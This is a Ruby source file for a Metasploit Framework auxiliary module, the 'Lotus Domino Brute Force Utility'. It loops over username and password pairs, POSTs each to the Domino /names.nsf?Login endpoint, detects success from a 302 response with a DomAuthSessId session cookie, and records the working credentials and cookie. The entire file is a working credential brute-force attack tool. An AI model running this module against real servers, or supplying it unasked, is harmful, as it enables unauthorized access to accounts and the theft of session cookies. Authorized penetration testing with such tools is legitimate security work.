##
# $Id: lotus_domino_login.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner


	def initialize
		super(
			'Name'           => 'Lotus Domino Brute Force Utility',
			'Version'        => '$Revision: 10394 $',
			'Description'    => 'Lotus Domino Authentication Brute Force Utility',
			'Author'         => 'Tiago Ferreira <tiago.ccna[at]gmail.com>',
			'License'        =>  MSF_LICENSE
		)

	end

	def run_host(ip)

		each_user_pass { |user, pass|
			do_login(user, pass)
		}

	end

	def do_login(user=nil,pass=nil)
		post_data = "username=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&RedirectTo=%2Fnames.nsf"
		vprint_status("http://#{vhost}:#{rport} - Lotus Domino - Trying username:'#{user}' with password:'#{pass}'")

		begin

			res = send_request_cgi({
				'method'  => 'POST',
				'uri'     => '/names.nsf?Login',
				'data'    => post_data,
			}, 20)

			if (res and res.code == 302 )
				if res.headers['Set-Cookie'].match(/DomAuthSessId=(.*);(.*)/i)
					print_good("http://#{vhost}:#{rport} - Lotus Domino - SUCCESSFUL login for '#{user}' : '#{pass}'")
					report_auth_info(
						:host   => rhost,
						:port => rport,
						:sname  => 'http',
						:user   => user,
						:pass   => pass,
						:proof  => "WEBAPP=\"Lotus Domino\", VHOST=#{vhost}, COOKIE=#{res.headers['Set-Cookie']}",
						:active => true
					)
					return :next_user
				end

				print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized 302 response")
				return :abort

			elsif res.body.to_s =~ /names.nsf\?Login/
				vprint_error("http://#{vhost}:#{rport} - Lotus Domino - Failed to login as '#{user}'")
				return
			else
				print_error("http://#{vhost}:#{rport} - Lotus Domino - Unrecognized #{res.code} response") if res
				return :abort
			end

			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
end

